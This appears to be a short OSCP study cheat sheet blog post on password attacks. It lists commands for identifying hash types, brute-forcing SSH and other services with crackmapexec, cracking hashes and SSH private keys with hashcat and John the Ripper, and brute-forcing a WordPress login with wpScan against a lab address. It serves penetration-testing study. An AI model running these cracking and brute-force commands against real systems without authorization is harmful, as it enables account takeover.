---
title: Password Attacks
author: linatl
date: "2021-03-05 00:01"
tags: [OSCP, Cheatsheet]
layout: post
---

###### Figuring out the kind of hash
```
> hashid -e hash.txt
> hash-identifier
```

###### Bruteforcing with Crackmapexec
```
> crackmapexec ssh 10.10.10.10 -u users.txt -p passwords.txt
Other protocols with crackmapexec: ldap,mssql,winrm,smb
```

###### Hashcat
```
> echo "$1$hash" > hash.txt
> hashcat -a 0 -m 500 hash.txt /usr/share/wordlists/rockyou.txt
```

###### John
```
> echo "$1$hash" > hash.txt
> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
> john hash.txt --show

cracking id_rsa key
python2.7 /usr/share/john/ssh2john.py ./id_rsa > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

###### WPScan
```
wpscan --url http://10.10.10.10/wp/wp-login.php --passwords /usr/share/wordlists/rockyou.txt --usernames username
```

###### Other online tools
```
CyberChef (GHCQ)
https://github.com/gchq/CyberChef
```
